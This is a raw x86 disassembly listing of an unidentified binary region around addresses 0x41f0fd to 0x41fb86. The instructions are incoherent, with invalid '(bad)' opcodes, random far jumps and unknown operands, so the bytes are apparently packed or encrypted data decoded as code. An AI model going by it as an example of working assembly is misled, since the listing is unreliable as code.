  41f0fd:	gs mov ah,0xb9
  41f100:	jle    0x41f137
  41f102:	xchg   edi,edx
  41f104:	cmp    BYTE PTR [edx-0x42ccacfe],ah
  41f10a:	jmp    0x1f28a3a8
  41f10f:	pop    edi
  41f110:	mov    al,0x17
  41f112:	jae    0x41f112
  41f114:	pop    edx
  41f115:	mov    ?,edi
  41f117:	dec    esi
  41f118:	test   eax,0x25a233b
  41f11d:	(bad)  
  41f11f:	or     BYTE PTR [ebp+0x3accd781],0x3c
  41f126:	pmulhuw mm4,QWORD PTR [eax]
  41f129:	dec    esi
  41f12a:	retf   
  41f12b:	sub    eax,0x6baf2460
  41f130:	cdq    
  41f131:	and    BYTE PTR [edi-0x105a59e9],dh
  41f137:	push   0x50b16dda
  41f13c:	sbb    al,0x15
  41f13e:	jle    0x41f0d4
  41f140:	jecxz  0x41f10c
	...
  41f1b2:	add    BYTE PTR [eax],al
  41f1b4:	stos   DWORD PTR es:[edi],eax
  41f1b5:	add    dh,BYTE PTR [edi-0x1a]
  41f1b8:	push   edi
  41f1ba:	mov    ebx,0xee13144f
  41f1bf:	mov    DWORD PTR [ebp+esi*1+0x4e4a1dde],ebx
  41f1c6:	add    DWORD PTR [eax],eax
  41f1c8:	test   BYTE PTR [eax],0x0
  41f1cb:	add    dh,cl
  41f1cd:	fwait
  41f1ce:	adc    BYTE PTR [esp+esi*4-0x5f48e7ed],dh
  41f1d5:	xchg   edx,eax
  41f1d6:	aaa    
  41f1d7:	mov    esp,0xc32537ab
  41f1dc:	es inc edx
  41f1de:	push   ds
  41f1df:	sub    dl,BYTE PTR [eax*8+0x7ae55206]
  41f1e6:	adc    eax,DWORD PTR [esp+0x564b249b]
  41f1ed:	mov    al,0xc2
  41f1ef:	push   ds
  41f1f0:	inc    edi
  41f1f1:	sub    al,0xcd
  41f1f3:	jecxz  0x41f177
  41f1f5:	sub    eax,0x3d80d08a
  41f1fa:	fcomp  QWORD PTR [ebx+0x301f4890]
  41f200:	sbb    edx,ecx
  41f202:	lea    eax,[ebx+ebx*1-0x472f0153]
  41f209:	xor    eax,0x1b21a82a
  41f20e:	jl     0x41f236
  41f210:	lahf   
  41f211:	test   ecx,ecx
  41f213:	xchg   ebx,eax
  41f214:	pop    ds
  41f215:	ins    BYTE PTR es:[edi],dx
  41f216:	jg     0x41f243
  41f218:	adc    cl,BYTE PTR [edx+ecx*1]
  41f21b:	cld    
  41f21c:	call   FWORD PTR [ebx+0x61831586]
  41f222:	or     BYTE PTR [ebp+esi*1-0x66],0xc2
  41f227:	loop   0x41f275
  41f229:	or     esi,esi
  41f22b:	ins    BYTE PTR es:[edi],dx
  41f22c:	mul    DWORD PTR [eax+0x14]
  41f22f:	mov    eax,0x43fa2e4d
  41f234:	inc    ecx
  41f235:	cmp    BYTE PTR [ecx],dh
  41f237:	push   ebp
  41f238:	fild   DWORD PTR [edx+ebx*1+0x50]
  41f23c:	mov    DWORD PTR [edi],ecx
  41f23e:	arpl   WORD PTR [eax],sp
  41f240:	mov    ebx,0x35996cd
  41f245:	and    BYTE PTR [ebx+edi*1],ah
  41f248:	inc    esi
  41f249:	add    dh,dl
  41f24b:	push   eax
  41f24c:	ror    BYTE PTR [ecx-0xbd7695d],1
  41f252:	or     cl,BYTE PTR [edi+0x1969eb46]
  41f258:	sbb    cl,BYTE PTR [eax-0x1c]
  41f25b:	imul   DWORD PTR [eax-0x80]
  41f25e:	or     al,0x7f
  41f260:	xchg   esi,eax
  41f261:	fmul   QWORD PTR [ebx+ebp*4-0x315cfe09]
  41f268:	cs repz mov ecx,0x8a5a1bd8
  41f270:	jle    0x41f2cf
  41f272:	or     eax,DWORD PTR [eax+0x12]
  41f275:	lods   al,BYTE PTR ds:[esi]
  41f276:	dec    esp
  41f277:	call   0x2401:0x7f853ef3
  41f27e:	lods   al,BYTE PTR ds:[esi]
  41f27f:	cmp    bl,BYTE PTR [edx-0x6b]
  41f282:	nop
  41f283:	out    dx,eax
  41f284:	or     DWORD PTR [ebp+edx*2+0xd],edx
  41f288:	inc    edi
  41f289:	dec    esp
  41f28a:	sbb    BYTE PTR [esi-0x3c],bh
  41f28d:	sub    ah,dh
  41f28f:	outs   dx,DWORD PTR ds:[esi]
  41f290:	or     ah,bl
  41f292:	aam    0x9
  41f294:	icebp  
  41f295:	push   esi
  41f296:	pop    es
  41f297:	es or  eax,0xc6a9066
  41f29d:	(bad)  
  41f29e:	ja     0x41f289
  41f2a0:	or     eax,0xa4f96647
  41f2a5:	pushf  
  41f2a6:	mov    bl,0xbf
  41f2a8:	adc    BYTE PTR [ecx],al
  41f2aa:	xchg   edi,eax
  41f2ab:	push   0xffffff8b
  41f2ad:	jmp    0x7864:0x6026a0d1
  41f2b4:	icebp  
  41f2b5:	fbstp  TBYTE PTR [ebx+0x66]
  41f2b8:	xor    ah,al
  41f2ba:	lods   eax,DWORD PTR ds:[esi]
  41f2bb:	fnstsw WORD PTR [eax+0xcdda0a3]
  41f2c1:	or     al,0x0
	...
  41f333:	add    BYTE PTR [ecx-0xe088ee],cl
  41f339:	jg     0x41f324
  41f33b:	xchg   esi,eax
  41f33c:	call   0x59b8:0x5d9531a0
  41f343:	inc    edx
  41f344:	inc    eax
  41f345:	dec    edi
  41f346:	add    DWORD PTR [eax],eax
  41f348:	test   BYTE PTR [eax],0x0
  41f34b:	add    BYTE PTR [edx+0x1b2a43c],dh
  41f351:	jmp    0xcf658cac
  41f356:	out    0xf,al
  41f358:	out    dx,al
  41f359:	mov    fs:0x37a5d3ee,eax
  41f35f:	xor    DWORD PTR [edi+ebx*8+0x43],eax
  41f363:	lahf   
  41f364:	out    0x59,al
  41f366:	xor    ecx,ebp
  41f368:	les    ebp,FWORD PTR [edx+eax*8-0x46]
  41f36c:	hlt    
  41f36d:	shl    BYTE PTR [edx+0x18760ec7],1
  41f373:	push   esp
  41f374:	aad    0x40
  41f376:	sub    cl,BYTE PTR [edi]
  41f378:	pop    ebp
  41f379:	sub    esp,edx
  41f37b:	push   ecx
  41f37c:	xchg   edi,eax
  41f37d:	or     al,0xa8
  41f37f:	sti    
  41f380:	pop    ebp
  41f381:	jns    0x41f357
  41f383:	mov    ss,WORD PTR [esi]
  41f385:	cld    
  41f386:	dec    esi
  41f387:	test   al,0x33
  41f389:	cs inc ecx
  41f38b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f38c:	cdq    
  41f38d:	and    BYTE PTR [ebx-0x50bf68a4],0x7
  41f394:	push   edi
  41f395:	cmp    eax,0x1cd110ea
  41f39a:	std    
  41f39b:	push   0x152e4574
  41f3a0:	or     eax,0xe0c26f
  41f3a5:	std    
  41f3a6:	pop    ebx
  41f3a7:	scas   eax,DWORD PTR es:[edi]
  41f3a8:	xchg   DWORD PTR [esp+eiz*8+0x26582fa3],ecx
  41f3af:	cdq    
  41f3b0:	or     esi,DWORD PTR [ebx+0x44110703]
  41f3b6:	call   0x4a446a2c
  41f3bb:	es jo  0x41f39a
  41f3be:	xlat   BYTE PTR ds:[ebx]
  41f3bf:	stos   BYTE PTR es:[edi],al
  41f3c0:	sahf   
  41f3c1:	sbb    bl,BYTE PTR [esi+0x5c]
  41f3c4:	cs dec ecx
  41f3c6:	cmp    DWORD PTR [eax+0x46],0xffffff93
  41f3ca:	jl     0x41f38c
  41f3cc:	add    BYTE PTR [eax-0x2e471315],dl
  41f3d2:	shl    BYTE PTR [ebx],cl
  41f3d4:	or     ch,BYTE PTR [edi-0x799b0b56]
  41f3da:	xchg   esi,eax
  41f3db:	xor    bh,BYTE PTR [ebp+0x754a05dc]
  41f3e1:	in     al,dx
  41f3e2:	fsubrp st(0),st
  41f3e4:	imul   ch
  41f3e6:	scas   al,BYTE PTR es:[edi]
  41f3e7:	xor    DWORD PTR [esi+0x60a3cc4a],0x40
  41f3ee:	push   es
  41f3ef:	icebp  
  41f3f0:	mov    dh,0x80
  41f3f2:	jae    0x41f3dd
  41f3f4:	cwde   
  41f3f5:	cs cld 
  41f3f7:	mov    ds,WORD PTR [ebp+0x69]
  41f3fa:	push   cs
  41f3fb:	stc    
  41f3fc:	xor    al,0x14
  41f3fe:	cmp    dh,BYTE PTR [edi]
  41f400:	in     al,0x15
  41f402:	ds je  0x41f459
  41f405:	pop    eax
  41f406:	in     eax,0x4
  41f408:	sub    bh,BYTE PTR [eax]
  41f40a:	fnstcw WORD PTR [edx-0x65af2c97]
  41f410:	das    
  41f411:	call   0x341d:0x3f47f82f
  41f418:	(bad)  
  41f419:	dec    edi
  41f41a:	inc    esi
  41f41b:	xor    ecx,edx
  41f41d:	retf   0x53af
  41f420:	mov    al,ds:0xafe78bb2
  41f425:	sub    BYTE PTR [eax-0x5264a581],bh
  41f42b:	in     al,dx
  41f42c:	shl    BYTE PTR [ecx-0x2445f0da],1
  41f432:	mov    dl,0xab
  41f434:	and    eax,edi
  41f436:	shr    esp,1
  41f438:	add    DWORD PTR [eax],ebp
  41f43a:	ins    BYTE PTR es:[edi],dx
  41f43b:	sub    DWORD PTR [ecx],ecx
  41f43d:	mov    esp,0xb7fc7a35
	...
  41f4b2:	add    BYTE PTR [eax],al
  41f4b4:	and    BYTE PTR [edx-0x35],ch
  41f4b7:	dec    ebx
  41f4b8:	retf   
  41f4b9:	jmp    0x41f45b
  41f4bb:	imul   ebx,DWORD PTR [ebx],0xfffffff6
  41f4be:	xchg   esp,eax
  41f4bf:	aad    0xac
  41f4c1:	je     0x41f47f
  41f4c3:	mov    WORD PTR [esi],?
  41f4c5:	push   eax
  41f4c6:	add    DWORD PTR [eax],eax
  41f4c8:	test   BYTE PTR [eax],0x0
  41f4cb:	add    al,dl
  41f4cd:	pop    esp
  41f4ce:	mov    ds:0xe03edb2f,al
  41f4d3:	inc    esi
  41f4d4:	call   DWORD PTR [edx+0x54e3fa7d]
  41f4da:	nop
  41f4db:	cmp    esi,DWORD PTR [eax+esi*8+0x5d]
  41f4df:	out    dx,eax
  41f4e0:	mov    dh,0x8
  41f4e2:	mov    cl,0x48
  41f4e4:	mov    al,ds:0x9a75f224
  41f4e9:	outs   dx,DWORD PTR ds:[esi]
  41f4ea:	jle    0x41f54f
  41f4ec:	jg     0x41f4df
  41f4ee:	cmp    ch,BYTE PTR [ebp-0x5a5b4229]
  41f4f4:	test   BYTE PTR [ebx+0x72],bl
  41f4f7:	lahf   
  41f4f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4f9:	sbb    cl,BYTE PTR [ebp+0x79]
  41f4fc:	and    al,0x8f
  41f4fe:	clc    
  41f4ff:	jns    0x41f502
  41f501:	loope  0x41f4d4
  41f503:	sub    BYTE PTR [edx+esi*1-0x4dc3e44b],cl
  41f50a:	pusha  
  41f50b:	or     al,0xc7
  41f50d:	mov    bl,0xe8
  41f50f:	add    ebp,DWORD PTR [ecx]
  41f511:	jbe    0x41f4c2
  41f513:	cmp    DWORD PTR [ebx-0x4307bf06],edx
  41f519:	les    ecx,FWORD PTR [ebx]
  41f51b:	sbb    eax,0x3c77cf18
  41f520:	call   0xae0b10f4
  41f525:	and    DWORD PTR [edi+0x51],edi
  41f528:	push   es
  41f529:	into   
  41f52a:	lea    ecx,[esi+0x4f]
  41f52d:	xchg   DWORD PTR [esi+0x18],ebp
  41f530:	iret   
  41f531:	jo     0x41f537
  41f533:	pusha  
  41f534:	or     DWORD PTR [esi],ecx
  41f536:	hlt    
  41f537:	je     0x41f55a
  41f539:	push   ebx
  41f53a:	pop    eax
  41f53b:	(bad)
  41f53e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f53f:	or     bl,ch
  41f541:	xor    eax,0xffffffc3
  41f544:	arpl   WORD PTR [esi+0x6a],bx
  41f547:	addr16 add eax,0x4f89fdba
  41f54d:	xlat   BYTE PTR ds:[ebx]
  41f54e:	push   0xb559a5cd
  41f553:	cmp    DWORD PTR [esp+ebx*1],esp
  41f556:	push   edx
  41f557:	ins    DWORD PTR es:[edi],dx
  41f558:	push   ecx
  41f559:	mov    esi,0xd433bf
  41f55e:	sub    dl,BYTE PTR [edi]
  41f560:	in     eax,0x5a
  41f562:	dec    eax
  41f563:	cmp    al,0x3b
  41f565:	mov    al,ds:0x8d902ed7
  41f56a:	int3   
  41f56b:	xor    BYTE PTR [ebp+0x69],bh
  41f56e:	cmp    esi,0x3e
  41f571:	add    al,0x29
  41f573:	fidiv  DWORD PTR [edi+ebp*8-0x3b]
  41f577:	stos   DWORD PTR es:[edi],eax
  41f578:	mov    gs,WORD PTR [eax-0x1f]
  41f57b:	push   eax
  41f57c:	mov    bl,0x1
  41f57e:	mov    WORD PTR [eax-0x98dbb81],cs
  41f584:	repz jg 0x41f5c6
  41f587:	ds mov esp,0x95ba4192
  41f58d:	shl    BYTE PTR [esp+eiz*4-0x6a179e71],1
  41f594:	and    edx,DWORD PTR [esp+edi*4]
  41f597:	pop    ds
  41f598:	or     al,0x3a
  41f59a:	xor    bl,dh
  41f59c:	add    BYTE PTR [edx+0x3a],0x5e
  41f5a0:	and    al,0x4a
  41f5a2:	rcr    BYTE PTR [edi-0x48],0x6c
  41f5a6:	les    esi,FWORD PTR [edx]
  41f5a8:	pop    edi
  41f5a9:	cmp    esi,edx
  41f5ab:	leave  
  41f5ac:	xor    ecx,esi
  41f5ae:	push   esp
  41f5af:	and    dl,BYTE PTR [esi+0x3c]
  41f5b2:	dec    ebp
  41f5b3:	fbld   TBYTE PTR [esi+0x24d4f1c6]
  41f5b9:	dec    ecx
  41f5ba:	xchg   esi,eax
  41f5bb:	xor    DWORD PTR [edx+0x41],0x86475c29
	...
  41f632:	add    BYTE PTR [eax],al
  41f634:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41f63a:	cmc    
  41f63b:	cwde   
  41f63c:	and    eax,0xaf01e835
  41f641:	xchg   edx,eax
  41f642:	shr    BYTE PTR [edi+0x2c],0x51
  41f646:	add    DWORD PTR [eax],eax
  41f648:	test   BYTE PTR [eax],0x0
  41f64b:	add    dl,al
  41f64d:	aam    0x1e
  41f64f:	pusha  
  41f650:	cli    
  41f651:	or     dl,bl
  41f653:	xlat   BYTE PTR ds:[ebx]
  41f654:	js     0x41f5d8
  41f656:	daa    
  41f657:	adc    al,0x6e
  41f659:	retf   0x1766
  41f65c:	mov    edi,0xb180b79
  41f661:	gs popa 
  41f663:	pusha  
  41f664:	(bad)  
  41f665:	fs cwde 
  41f667:	push   edi
  41f668:	sub    DWORD PTR [edx],ebx
  41f66a:	inc    edi
  41f66b:	jp     0x41f6ac
  41f66d:	stos   DWORD PTR es:[edi],eax
  41f66e:	mov    eax,ds:0x9f364afd
  41f673:	lods   al,BYTE PTR ds:[esi]
  41f674:	pop    esp
  41f675:	imul   edx,DWORD PTR [edx-0x635bbdc8],0xc79c9f58
  41f67f:	mov    edx,0x49ecf5d7
  41f684:	out    dx,eax
  41f685:	sbb    eax,0xd295f240
  41f68a:	jbe    0x41f6d6
  41f68c:	aas    
  41f68d:	mov    BYTE PTR [edx],cl
  41f68f:	mov    eax,ds:0x4c31064
  41f694:	stos   BYTE PTR es:[edi],al
  41f695:	adc    al,0x23
  41f697:	push   esp
  41f698:	pop    ss
  41f699:	pop    esi
  41f69a:	push   ebp
  41f69b:	js     0x41f6ce
  41f69d:	xchg   esi,eax
  41f69f:	add    al,bh
  41f6a1:	mov    ds:0x692e9578,al
  41f6a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6a7:	mov    bh,0x3f
  41f6a9:	adc    edi,edi
  41f6ab:	fidiv  DWORD PTR ds:0x8ed09494
  41f6b1:	loopne 0x41f66b
  41f6b3:	push   esi
  41f6b4:	loopne 0x41f6dc
  41f6b6:	(bad)  
  41f6b7:	jb     0x41f6cb
  41f6b9:	(bad)  [edi+edx*8+0x6e6b592c]
  41f6c0:	scas   al,BYTE PTR es:[edi]
  41f6c1:	xor    BYTE PTR es:[si],bh
  41f6c5:	ins    DWORD PTR es:[edi],dx
  41f6c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6c7:	inc    bl
  41f6c9:	cdq    
  41f6ca:	or     eax,0xb16eb638
  41f6cf:	cdq    
  41f6d0:	or     esp,ecx
  41f6d2:	lea    ecx,[edi+eax*4+0x24ed176a]
  41f6d9:	sub    al,0x8a
  41f6db:	fist   WORD PTR [ebp-0x33]
  41f6de:	inc    edi
  41f6df:	les    ecx,FWORD PTR [ebx]
  41f6e1:	pop    eax
  41f6e2:	pop    ebx
  41f6e3:	jmp    0x459c:0xecb85556
  41f6ea:	inc    ebx
  41f6eb:	call   0x1ab5e288
  41f6f0:	jl     0x41f719
  41f6f2:	jb     0x41f705
  41f6f4:	ins    DWORD PTR es:[edi],dx
  41f6f5:	fiadd  DWORD PTR [eax+0x4fb50b21]
  41f6fb:	inc    ecx
  41f6fc:	test   BYTE PTR [edi+0x63ccc341],cl
  41f702:	pop    edi
  41f703:	les    esi,FWORD PTR [ebx]
  41f705:	and    cl,dh
  41f707:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f708:	jg     0x41f76a
  41f70a:	cmp    dh,al
  41f70c:	hlt    
  41f70d:	hlt    
  41f70e:	div    DWORD PTR [ecx-0x27]
  41f711:	inc    ecx
  41f712:	jbe    0x41f784
  41f714:	sub    BYTE PTR [edx],ch
  41f716:	bound  ecx,QWORD PTR [ecx]
  41f718:	gs fwait
  41f71a:	xchg   edx,eax
  41f71b:	int    0x9c
  41f71d:	pop    ebx
  41f71e:	lea    ebx,[ebx-0x393d5ad5]
  41f724:	icebp  
  41f725:	push   ebp
  41f726:	cmp    al,0xa1
  41f728:	mov    WORD PTR [ebx+0x54],?
  41f72b:	rcr    BYTE PTR [ebx+0x2b264616],0xc9
  41f732:	ret    
  41f733:	int    0xd3
  41f735:	cmp    DWORD PTR [eax-0x48f1e99c],ebx
  41f73b:	(bad)  
  41f73c:	fxch   st(0)
  41f73e:	(bad)  
  41f740:	test   al,0xb
	...
  41f7b2:	add    BYTE PTR [eax],al
  41f7b4:	sub    eax,0x9e5c8a39
  41f7b9:	(bad)  
  41f7ba:	(bad)  
  41f7bb:	jns    0x41f77e
  41f7bd:	clc    
  41f7be:	mov    ah,0x9e
  41f7c0:	and    DWORD PTR [ebx+0x5222e780],edx
  41f7c6:	add    DWORD PTR [eax],eax
  41f7c8:	test   BYTE PTR [eax],0x0
  41f7cb:	add    BYTE PTR [edi+ecx*1],ah
  41f7ce:	stos   DWORD PTR es:[edi],eax
  41f7cf:	sbb    dh,BYTE PTR [eax-0x65633d9f]
  41f7d5:	add    eax,0x6bd47e7e
  41f7da:	push   ds
  41f7db:	add    al,0x28
  41f7dd:	pusha  
  41f7de:	cmp    dl,BYTE PTR [si-0x6c5a]
  41f7e3:	stc    
  41f7e4:	pop    eax
  41f7e5:	or     al,0xdd
  41f7e7:	dec    eax
  41f7e8:	sbb    ah,ch
  41f7ea:	mov    ch,0xf1
  41f7ec:	xor    al,bl
  41f7ee:	xchg   ebx,eax
  41f7ef:	(bad)  
  41f7f0:	adc    DWORD PTR [eax],ebx
  41f7f2:	in     eax,dx
  41f7f3:	(bad)  
  41f7f4:	(bad)  
  41f7f5:	popa   
  41f7f6:	cdq    
  41f7f7:	dec    ebp
  41f7f8:	shl    BYTE PTR [edi],0x76
  41f7fb:	inc    esp
  41f7fc:	fwait
  41f7fd:	fs clc 
  41f7ff:	dec    ebx
  41f800:	pop    edi
  41f801:	(bad)  
  41f802:	ror    DWORD PTR [ecx],0x79
  41f805:	pop    edi
  41f806:	xlat   BYTE PTR ds:[ebx]
  41f807:	dec    edx
  41f808:	mov    ah,0x57
  41f80a:	fsub   DWORD PTR [ecx-0x80]
  41f80d:	cld    
  41f80e:	adc    al,0x73
  41f810:	mov    bh,0xaa
  41f812:	or     eax,0x2b3a0a3c
  41f817:	or     DWORD PTR ds:0xc66c6f8c,edx
  41f81d:	shr    edx,cl
  41f81f:	xor    ch,0x6d
  41f822:	out    dx,al
  41f823:	es pushf 
  41f825:	adc    DWORD PTR [ecx-0x19d78f93],ebx
  41f82b:	out    0x70,eax
  41f82d:	xor    eax,0x44db3ad4
  41f832:	jp     0x41f7eb
  41f834:	inc    eax
  41f835:	mov    bh,0xbb
  41f837:	fisub  DWORD PTR [esi+0x32]
  41f83a:	mov    edx,0x660c2922
  41f83f:	jno    0x41f854
  41f841:	nop    DWORD PTR [ecx-0x22]
  41f845:	and    bh,BYTE PTR [ebx+0x3]
  41f848:	inc    esp
  41f849:	enter  0xc7d0,0x56
  41f84d:	mov    ecx,DWORD PTR [edx+0x3e]
  41f850:	dec    ebp
  41f851:	xchg   esi,eax
  41f852:	and    ah,cl
  41f854:	out    dx,al
  41f855:	xor    BYTE PTR [esi],0xcb
  41f858:	push   esi
  41f859:	aad    0xec
  41f85b:	mov    bl,0xf7
  41f85d:	in     eax,dx
  41f85e:	xchg   BYTE PTR ds:0xec268de3,ah
  41f864:	jbe    0x41f8ab
  41f866:	(bad)  
  41f867:	out    0x77,al
  41f869:	xchg   ebx,eax
  41f86a:	mov    al,0xf9
  41f86c:	mov    eax,0x1f4ad2d9
  41f871:	fs xchg ecx,eax
  41f873:	adc    eax,0xf51aaf70
  41f878:	adc    esi,DWORD PTR [esi-0x7c66c651]
  41f87e:	mov    al,ds:0xc552afa4
  41f883:	adc    al,0x55
  41f885:	pop    esp
  41f886:	rol    BYTE PTR [ecx+0x25ebed2d],1
  41f88c:	ja     0x41f8ec
  41f88e:	cwde   
  41f88f:	cli    
  41f890:	lea    edi,[eax]
  41f892:	lahf   
  41f893:	imul   ebp,DWORD PTR [edx+ebx*2+0x21468718],0x63
  41f89b:	pop    ecx
  41f89c:	xchg   BYTE PTR [esi-0x91b573d],cl
  41f8a2:	icebp  
  41f8a3:	push   eax
  41f8a4:	xor    bl,dh
  41f8a6:	dec    esp
  41f8a7:	push   ecx
  41f8a8:	fmul   st,st(6)
  41f8aa:	lea    edi,ds:0xf17e2386
  41f8b0:	test   BYTE PTR [ecx+0x2b27382],cl
  41f8b6:	daa    
  41f8b7:	cli    
  41f8b8:	pop    ss
  41f8b9:	adc    al,0xb6
  41f8bb:	cmp    eax,esp
  41f8bd:	fsubr  QWORD PTR [ebx+edx*1-0x2a]
  41f8c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  41f932:	add    BYTE PTR [eax],al
  41f934:	js     0x41f933
  41f936:	ret    0xc766
  41f939:	jg     0x41f937
  41f93b:	(bad)  
  41f93c:	mov    ecx,0x529ffef7
  41f941:	jge    0x41f904
  41f943:	mov    ch,0x18
  41f945:	push   ebx
  41f946:	add    DWORD PTR [eax],eax
  41f948:	test   BYTE PTR [eax],0x0
  41f94b:	add    BYTE PTR [eax-0x4b],dl
  41f94e:	pusha  
  41f94f:	out    dx,eax
  41f950:	xchg   edi,eax
  41f951:	push   0xcb46cfeb
  41f956:	mov    ah,0x25
  41f958:	mov    ?,WORD PTR [bx+0x12]
  41f95c:	jmp    0x41f8de
  41f95e:	mov    ds:0xa549fe76,eax
  41f963:	gs mul DWORD PTR es:[edx+0x6b6aba4b]
  41f96b:	(bad)  
  41f96c:	test   al,0xf4
  41f96e:	push   0x94db03ab
  41f973:	mov    ebx,0x86b6d05b
  41f978:	gs push ecx
  41f97a:	mov    eax,ebx
  41f97c:	std    
  41f97d:	or     BYTE PTR [edi+0x1f],0xa5
  41f981:	inc    esp
  41f982:	loope  0x41f9b5
  41f984:	xor    BYTE PTR [ebp-0x68d3e141],ah
  41f98a:	add    ecx,DWORD PTR [edi-0x8decd85]
  41f990:	dec    edi
  41f991:	and    dl,BYTE PTR [ebp-0x379f8d36]
  41f997:	mov    ah,0xf4
  41f999:	hlt    
  41f99a:	sbb    DWORD PTR [edi],ecx
  41f99c:	adc    DWORD PTR [ebx+0x49],edx
  41f99f:	mov    ebx,0x582a00fc
  41f9a4:	xor    eax,0xecf695d4
  41f9a9:	in     al,0x97
  41f9ab:	push   es
  41f9ac:	mov    edi,0xbe8b793e
  41f9b1:	or     al,0x4e
  41f9b3:	shr    DWORD PTR [ecx],cl
  41f9b5:	(bad)  
  41f9b6:	jmp    0x41f9c4
  41f9b8:	dec    edi
  41f9b9:	pushf  
  41f9ba:	imul   esp,DWORD PTR [esi-0x4e],0xe946cc0f
  41f9c1:	ss add eax,0xd453bac7
  41f9c7:	xlat   BYTE PTR ds:[ebx]
  41f9c8:	xchg   edx,eax
  41f9c9:	inc    esi
  41f9ca:	mov    bh,0x9b
  41f9cc:	jbe    0x41fa0b
  41f9ce:	std    
  41f9cf:	pop    edx
  41f9d0:	or     BYTE PTR [eax-0x3a],0x7f
  41f9d4:	retf   0x2666
  41f9d7:	push   ss
  41f9d8:	(bad)
  41f9db:	out    dx,al
  41f9dc:	stc    
  41f9dd:	ror    edx,1
  41f9df:	dec    ecx
  41f9e0:	lahf   
  41f9e1:	pop    ebx
  41f9e2:	stc    
  41f9e3:	popf   
  41f9e4:	pop    esp
  41f9e5:	and    eax,0x19b5a4d8
  41f9ea:	mov    ds:0x21543944,eax
  41f9ef:	push   es
  41f9f0:	ja     0x41f97f
  41f9f2:	xchg   ebx,eax
  41f9f3:	imul   eax,DWORD PTR [edx+edi*4+0x31f98abf],0x460277ce
  41f9fe:	fidivr DWORD PTR [edi-0x49]
  41fa01:	and    dl,BYTE PTR [esi+0xf127c8b]
  41fa07:	sub    DWORD PTR [edi],esi
  41fa09:	stos   BYTE PTR es:[edi],al
  41fa0a:	ss xchg ebx,eax
  41fa0c:	call   0x236c53be
  41fa11:	jmp    0x855:0xe47f192
  41fa18:	and    edi,DWORD PTR [ebx+0x1a0aec26]
  41fa1e:	pusha  
  41fa1f:	pop    esp
  41fa20:	push   ebx
  41fa21:	test   BYTE PTR [eax],bh
  41fa23:	aam    0x53
  41fa25:	jnp    0x41fa9f
  41fa27:	pop    esi
  41fa28:	sbb    bl,BYTE PTR [esp+edx*8-0x64fe22f6]
  41fa2f:	or     ebp,edi
  41fa31:	adc    dl,dl
  41fa33:	fiadd  DWORD PTR [edi+0x27]
  41fa36:	add    al,0xcd
  41fa38:	ud0    eax,ebx
  41fa3b:	retf   0x4f65
  41fa3e:	pop    eax
  41fa3f:	sbb    DWORD PTR [edi+0x41],0x0
	...
  41fab1:	add    BYTE PTR [eax],al
  41fab3:	add    BYTE PTR [edx],dl
  41fab5:	das    
  41fab6:	mov    esi,DWORD PTR [edi+edi*4+0x4eaf3fb4]
  41fabd:	cwde   
  41fabe:	out    dx,eax
  41fabf:	daa    
  41fac0:	mov    esp,0xe6806b3
  41fac5:	push   esp
  41fac6:	add    DWORD PTR [eax],eax
  41fac8:	test   BYTE PTR [eax],0x0
  41facb:	add    ch,dh
  41facd:	push   ecx
  41face:	adc    eax,0x20f37a3d
  41fad3:	out    dx,al
  41fad4:	leave  
  41fad5:	mov    BYTE PTR [eax],ch
  41fad7:	sub    BYTE PTR [ecx+0x22ac76cf],0x84
  41fade:	push   edi
  41fadf:	pop    ss
  41fae0:	inc    edi
  41fae1:	mov    ebx,0x931ee900
  41fae6:	jne    0x41fae3
  41fae8:	mov    bh,0x55
  41faea:	sbb    dh,ah
  41faec:	push   es
  41faed:	ds call 0x7c6b045a
  41faf3:	push   esi
  41faf4:	pop    edi
  41faf5:	add    al,0xae
  41faf7:	pop    edi
  41faf8:	rcr    ah,0x5b
  41fafb:	std    
  41fafc:	loope  0x41fb59
  41fafe:	jnp    0x41faa0
  41fb00:	add    al,0x27
  41fb02:	pushf  
  41fb03:	daa    
  41fb04:	pop    ss
  41fb05:	jbe    0x41fa91
  41fb07:	sub    bl,BYTE PTR [ebx+ebx*4-0x60]
  41fb0b:	cdq    
  41fb0c:	addr16 sbb al,0xa3
  41fb0f:	in     eax,dx
  41fb10:	fwait
  41fb11:	inc    esp
  41fb12:	stc    
  41fb13:	mov    ebp,0x7d03a573
  41fb18:	inc    edi
  41fb19:	or     al,0xce
  41fb1b:	bound  edx,QWORD PTR [edi+0x7f]
  41fb1e:	test   BYTE PTR ds:0x2797cefe,0x0
  41fb25:	rcl    BYTE PTR [esp+edx*2-0x505c2fff],1
  41fb2c:	mov    edx,0xa7b3623b
  41fb31:	pushf  
  41fb32:	dec    ebx
  41fb33:	xchg   ebp,eax
  41fb34:	pop    ecx
  41fb35:	add    DWORD PTR ds:0xefaef973,0x683fb37f
  41fb3f:	xchg   edx,eax
  41fb40:	retf   
  41fb41:	pop    eax
  41fb42:	or     bl,dl
  41fb44:	jecxz  0x41fb76
  41fb46:	pop    ecx
  41fb47:	and    edx,DWORD PTR [edx]
  41fb49:	adc    eax,0x2d78c817
  41fb4e:	jno    0x41fbcf
  41fb50:	jnp    0x41fbd0
  41fb52:	inc    ecx
  41fb53:	sbb    DWORD PTR [eax],esi
  41fb55:	js     0x41fb33
  41fb57:	(bad)  
  41fb58:	sub    ch,cl
  41fb5a:	mov    BYTE PTR [ecx+0x47c56ba1],0x6e
  41fb61:	jmp    0x41fbc4
  41fb63:	sbb    DWORD PTR [eax-0x69],ebx
  41fb66:	dec    edi
  41fb67:	je     0x41fb80
  41fb69:	xor    BYTE PTR [edi+0x56856402],bh
  41fb6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb70:	pusha  
  41fb71:	xchg   DWORD PTR [eax+0x6d],ebx
  41fb74:	sbb    DWORD PTR [edx],esp
  41fb76:	lods   al,BYTE PTR ds:[esi]
  41fb77:	xor    BYTE PTR [eax+ebp*2],dl
  41fb7a:	pop    ecx
  41fb7b:	and    esp,ecx
  41fb7d:	and    BYTE PTR [edx],al
  41fb7f:	xchg   DWORD PTR [edi-0x5cce65dc],esi
  41fb85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb86:	pop    ecx
